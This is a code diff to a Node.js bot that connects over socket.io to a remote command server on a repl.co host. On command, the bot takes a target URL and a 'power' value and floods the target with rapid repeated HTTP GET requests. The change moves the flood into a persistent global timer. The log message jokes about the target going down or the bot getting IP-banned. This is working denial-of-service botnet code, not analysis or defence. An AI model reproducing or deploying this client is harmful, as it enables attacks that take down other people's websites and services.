@@ -12,12 +12,19 @@ app.get("/", async (req, res) => {
   res.end(`<h1 style="font-size:10vw">${e}</h1>`)
 })
 
+var url = ''
+var pow = 0
+
 const socket = io("wss://server.iep0kjum6sity5e.repl.co", {
   reconnection: true,
   reconnectionAttempts: 10000,
   reconnectionDelay: 6000,
   reconnectionDelayMax: 100000,
 });
+
+setInterval(()=>{
+      for (i=0;i<pow;i++)axios.get(url).catch(err =>{console.log("maybe its down or we got ip banned lol.")})
+      }, .025)
 
 socket.on('message', async m => {
   console.log(m)
@@ -26,16 +33,8 @@ socket.on('message', async m => {
     var u = args[0]
     var p = args[1]
     console.log("Booting: " + u + " with power: " + p)
-    for (i = p; i > 0; i--) {
-      var r = 0
-      var l
-      l = setInterval(()=>{
-      axios.get(u).catch(err =>{console.log("maybe its down or we got ip banned lol.", u)})
-      console.log(i)
-      r++
-      if (r == 10000) clearInterval(l)
-      }, .025)
-    }
+    url = u
+    pow = p
   }
 })
 socket.on('connect', function() { 
